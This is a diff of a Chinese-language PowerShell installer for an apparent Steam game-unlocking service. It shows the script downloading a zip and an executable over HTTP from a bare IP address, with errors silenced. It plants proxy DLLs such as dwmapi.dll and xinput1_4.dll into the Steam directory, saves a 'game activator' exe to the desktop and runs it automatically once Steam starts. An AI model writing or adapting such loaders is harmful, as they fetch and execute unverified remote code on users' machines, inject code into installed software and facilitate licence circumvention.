@@ -9,17 +9,16 @@ $ErrorActionPreference = 'SilentlyContinue'
 
 # ========== 配置区 ==========
 $ZipUrl = "http://47.100.104.45/files/patch.zip"
-# 服务端存英文名，确保下载绝对通畅
-$ActivatorUrl = "http://47.100.104.45/files/steam_activator.exe"
+# 【回退核心点】：直接下载中文名的 exe 到桌面
+$ActivatorUrl = "http://47.100.104.45/files/游戏激活程序.exe"
 $TempZip = "$env:TEMP\steam_patch.zip"
 $TempUnzip = "$env:TEMP\steam_patch_temp"
 $CopyList = @("config","dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll","steam.cfg","opensteamtool.toml")
-# 强制安装到 C 盘固定目录
-$InstallDir = "C:\Program Files\SteamPatch"
-$ActivatorFileName = "steam_activator.exe"
+$Desktop = [Environment]::GetFolderPath("Desktop")
+$ActivatorExeName = "游戏激活程序.exe"
 # ============================
 
-# ===== 补丁安装逻辑 =====
+# ===== 补丁安装逻辑 (保持不变) =====
 $SteamRoot = $null
 if(Test-Path "HKCU:\Software\Valve\Steam"){
     $regInfo = Get-ItemProperty "HKCU:\Software\Valve\Steam"
@@ -107,54 +106,24 @@ if($installComplete){
 }
 Write-Host "=====================================`n" -ForegroundColor Cyan
 
-# ========== 下载最新版激活程序到 C 盘 ==========
-if(-not (Test-Path $InstallDir)){
-    New-Item $InstallDir -ItemType Directory -Force | Out-Null
-}
-$activatorExePath = Join-Path $InstallDir $ActivatorFileName
+# ========== 下载最新版激活程序直接到桌面 ==========
+$activatorExePath = Join-Path $Desktop $ActivatorExeName
 
 try {
     $webClient.DownloadFile($ActivatorUrl, $activatorExePath)
+    Write-Host "✅ 游戏激活程序.exe 已成功下载到桌面" -ForegroundColor Green
 } catch {
     try {
         Invoke-WebRequest -Uri $ActivatorUrl -OutFile $activatorExePath -UseBasicParsing -ErrorAction Stop
     } catch {
-        Write-Host "❌ ERROR: 激活工具下载失败，请检查网络" -ForegroundColor Red
+        Write-Host "❌ ERROR: 激活工具下载失败，请检查网络。如果持续失败，建议手动发送给客户。" -ForegroundColor Red
         Start-Sleep 3
     }
 }
 
-# ========== 【核心修复】：使用系统 VBS 绕过编码死结，100% 生成中文快捷方式 ==========
-$desktopPath = [Environment]::GetFolderPath("Desktop").TrimEnd('\')
-$shortcutPath = "$desktopPath\游戏激活程序.exe"
-$steamExePath = Join-Path $SteamRoot "steam.exe"
-
-try {
-    # 生成一段极其稳健的 VBS 代码
-    $vbsContent = @"
-Set WshShell = WScript.CreateObject("WScript.Shell")
-Set oShellLink = WshShell.CreateShortcut("$shortcutPath")
-oShellLink.TargetPath = "$activatorExePath"
-oShellLink.IconLocation = "$steamExePath, 0"
-oShellLink.Save()
-"@
-    # 用 UTF-16 编码写入临时 VBS 文件，确保无论什么系统环境都能识别中文
-    $tempVbsPath = [System.IO.Path]::GetTempFileName() + ".vbs"
-    [System.IO.File]::WriteAllText($tempVbsPath, $vbsContent, [System.Text.Encoding]::Unicode)
-    
-    # 隐藏执行 VBS，执行完毕后自动删除
-    Start-Process "wscript.exe" -ArgumentList "`"$tempVbsPath`"" -Wait -WindowStyle Hidden
-    Remove-Item $tempVbsPath -Force
-
-    Write-Host "✅ 桌面快捷方式已完美生成：游戏激活程序.exe" -ForegroundColor Green
-} catch {
-    Write-Host "⚠️ WARNING: 快捷方式生成异常，请手动将 C:\Program Files\SteamPatch\steam_activator.exe 发送到桌面快捷方式" -ForegroundColor Yellow
-}
-# ============================================================
-
-# ========== 启动Steam + 等待主界面 + 自动弹出 EXE ==========
+# ========== 启动Steam + 等待主界面 + 自动弹出桌面 EXE ==========
 Start-Process "$SteamRoot\steam.exe"
-Write-Host "⏳ Steam已启动，【请登录Steam激活游戏】..." -ForegroundColor Cyan
+Write-Host "⏳ Steam已启动，【请登录Steam完成激活】..." -ForegroundColor Cyan
 
 $waitCounter = 0
 while ($waitCounter -lt 30) {
@@ -170,7 +139,7 @@ Start-Sleep -Seconds 1
 if (Test-Path $activatorExePath) {
     Start-Process $activatorExePath
 } else {
-    Write-Host "⚠️ WARNING: 激活工具不存在，请检查 C:\Program Files\SteamPatch" -ForegroundColor Yellow
+    Write-Host "⚠️ WARNING: 激活工具不存在，请检查桌面" -ForegroundColor Yellow
     Start-Sleep 5
 }
 
